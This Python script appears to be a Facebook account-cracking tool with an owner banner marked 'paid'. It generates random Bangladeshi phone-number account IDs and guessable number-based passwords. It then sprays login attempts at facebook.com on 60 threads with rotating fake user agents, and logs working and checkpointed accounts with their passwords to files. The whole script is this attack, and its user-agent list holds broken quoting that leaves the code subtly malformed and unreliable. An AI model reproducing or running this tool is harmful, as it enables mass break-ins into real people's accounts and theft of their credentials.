import os,time,sys
os.system('clear')
from os import path
import os,base64,zlib,pip,urllib
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
try:
        import os,requests,json,time,re,random,sys,uuid,string,subprocess
        from string import *
        from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
        os.system(f'pip install requests futures==2 > /dev/null')
except:pass
logo = """ \033[1;92
\033[1;31m┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
\033[1;31m┃\033[0;42;37m┏┓ ┳ ┳┓┳ ┳ ┓┏┓\033[1;37;40m\033[1;31m┃\033[1;33mOWNER   : ASKAT-MRIDHA \033[1;31m   ┃
\033[1;31m┃\033[0;42;37m┃┃ ┃ ┃┃┃ ┃ ┃┫ \033[1;37;40m\033[1;31m┃\033[1;33mGITHUB  : askatxriddu  \033[1;31m   ┃\033[1;32m┏━━━━━━━━━━━━━━┓\033[1;32m 
\033[1;31m┃\033[0;42;37m┣┛ ┻ ┛┗┻ ┻ ┛┗┛\033[1;37;40m\033[1;31m┃\033[1;33mFACEBOK : ASKAT-MRIDHA\033[1;31m┃\033[1;32m┃ \033[0;41;37mVERSION \033[0;37;41mPAID\033[1;37;40m\033[1;32m ┃ \033[1;37;40m \033[1;32m
\033[1;31m┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\033[1;32m┗━━━━━━━━━━━━━━┛\033[1;32m
"""
ok = []
cp = []
id = []
session = requests.Session()
user = []
loop = 0
oks = []
cps = []
loop = 0
ugen=[]
ugen2=[]

ugen = (

'Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36', (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36', (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; SM-G980F Build/QP1A.190711.020; wv) AppleWebKit/537.36', (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 9; SM-G973U Build/PPR1.180610.011) AppleWebKit/537.36', (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36', (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36', (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36', (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36', (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 6.0.1; SM-G935S Build/MMB29K; wv) AppleWebKit/537.36', (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; Pixel 6 Build/SD1A.210817.023; wv) AppleWebKit/537.36', (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.71 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; Pixel 5 Build/RQ3A.210805.001.A1; wv) AppleWebKit/537.36', (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.159 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; Google Pixel 4 Build/QD1A.190821.014.C2; wv) AppleWebKit/537.36', (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; Google Pixel 4 Build/QD1A.190821.014.C2; wv) AppleWebKit/537.36', (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 8.0.0; Pixel 2 Build/OPD1.170811.002; wv) AppleWebKit/537.36', (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 7.1.1; Google Pixel Build/NMF26F; wv) AppleWebKit/537.36', (KHTML, like Gecko) Version/4.0 Chrome/54.0.2840.85 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 6.0.1; Nexus 6P Build/MMB29P) AppleWebKit/537.36', (KHTML, like Gecko) Chrome/47.0.2526.83 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 9; J8110 Build/55.0.A.0.552; wv) AppleWebKit/537.36', (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 7.1.1; G8231 Build/41.2.A.0.219; wv) AppleWebKit/537.36', (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 6.0.1; E6653 Build/32.2.A.0.253) AppleWebKit/537.36', (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; HTC Desire 21 pro 5G) AppleWebKit/537.36', (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36', 
'Mozilla/5.0 (Linux; Android 10; Wildfire U20 5G) AppleWebKit/537.36', (KHTML, like Gecko) Chrome/74.0.3729.136', Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 6.0; HTC One X10 Build/MRA58K; wv) AppleWebKit/537.36', (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.98 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 6.0; HTC One M9 Build/MRA58K) AppleWebKit/537.36', (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36',

)
for ua in range(1000):
      a='Mozilla/5.0 (Linux; Android'
      b=random.choice(['12' , '13' , '14' , '15'])
      c='SM-A125U Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
      d=random.randrange(40,100)
      e='0'
      f=random.randrange(3000,6000)
      g=random.randrange(20,100)
      h='Mobile Safari/537.36'
      ug=(f"{a} {b}; {c}{d}.{e}.{f}.{g} {h}")
      ugen.append(ug)
def Main():
	os.system('clear')
	print(logo)
	print("<> BD SIM CODE : [017 018 019 013 015 016] ")
	love = input('<> SELECT : ')
	print('<> EXAMPLE : [1000,5000,10000,15000,20000] ')
	limit = int(input('<> LIMIT : '))
	for nmbr in range(limit):
		lova = ''.join(random.choice(string.digits) for _ in range(2))
		lovb = ''.join(random.choice(string.digits) for _ in range(2))
		nmp = ''.join(random.choice(string.digits) for _ in range(4))
		user.append(nmp)
	with tred(max_workers=60) as turag:
		os.system('clear')
		print(logo)
		tl = str(len(user))
		print('<> CHOICE CODE : '+love)
		print('<> TOTAL ID   :  '+tl)
		print('<> CRACK STARTED....... ')
		print(50*'━')
		for guru in user:
			uid = love+lova+lovb+guru
			pwx = [lova+lovb+guru,love+lova+lovb,love+love]
			turag.submit(test,uid,pwx,tl)
	print(50*'━')
	print(' <> CRACK DONE......... ')
	print(50*'━')
	exit()
def test(uid,pwx,tl):
    global loop
    global cps    
    global oks
    global agents
    try:
        for ps in pwx:
            session = requests.Session()
            sys.stdout.write(f'\r\033[1;90m[\033[1;92mCyber-Army\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
            pro = random.choice(ugen)
            free_fb = session.get('https://m.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'mbasic.facebook.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7',
            'cache-control': 'max-age=0',
            'sec-ch-ua': '"Google Chrome";v="108", "Chromium";v="108", "Not=A?Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': pro}

            lo = session.post('https://www.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print(f'\r\33[1;92m[ASKAT-OK] '+cid+' ¤ '+ps+'\33[0;92m')
                oks.append(cid)
                open('/sdcard/ASKAT-ok.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print(f"\r\33[1;92m[PINIK-CP] {uid} ¤ {ps}")
                open('/sdcard/PINIK-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1        
    except:
        pass
Main()